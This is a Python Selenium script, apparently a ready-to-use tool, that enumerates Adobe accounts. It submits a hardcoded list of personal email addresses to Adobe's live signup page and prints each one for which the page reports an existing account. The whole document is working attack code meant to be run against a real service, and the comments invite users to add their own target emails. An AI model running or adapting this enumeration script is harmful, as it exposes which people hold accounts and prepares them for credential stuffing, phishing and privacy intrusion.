#  User Enum Adobe

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff


print("The usernames present in Adobe are:")

# Place all the Email IDs to test in the for loop as shown below.
# You can remove all the Email IDs below
for i in ["ccohen@aol.com", "superman@gmail.com", "keijser@aol.com", "superman@gmail.com", "ajohnson@hotmail.com", "rnewman@aol.com"]:

    user = i

    # Using edge browser
    # driver = webdriver.Edge(executable_path='msedgedriver')

    # Using Firefox browser
    driver = webdriver.FirefoxProfile()
    driver = webdriver.Firefox(driver)

    driver.get("https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2Fadobedotcom2%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Fwww.adobe.com%252F%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%26state%3D%257B%2522ac%2522%253A%2522%2522%257D%26code_challenge_method%3Dplain%26use_ms_for_expiry%3Dtrue&client_id=adobedotcom2&scope=creative_cloud%2CAdobeID%2Copenid%2Cgnav%2Cread_organizations%2Cadditional_info.projectedProductContext%2Csao.ACOM_CLOUD_STORAGE%2Csao.stock%2Csao.cce_private%2Cadditional_info.roles&denied_callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fdenied%2Fadobedotcom2%3Fredirect_uri%3Dhttps%253A%252F%252Fwww.adobe.com%252F%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%26response_type%3Dtoken%26state%3D%257B%2522ac%2522%253A%2522%2522%257D&state=%7B%22ac%22%3A%22%22%7D&relay=4827a8d2-b951-46ac-ae3a-4a2de4a089f2&locale=en_US&flow_type=token&idp_flow_type=login#/signup")
    p1 = driver.page_source
    elem=driver.find_element_by_xpath("//input[@type='email']") #type = 'text'/'email'
    elem.send_keys(user)
    elem.send_keys(Keys.RETURN)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2,p1)

    if "account with this email address already exists" in p3:
        print(i)
    sleep(2)
    driver.close()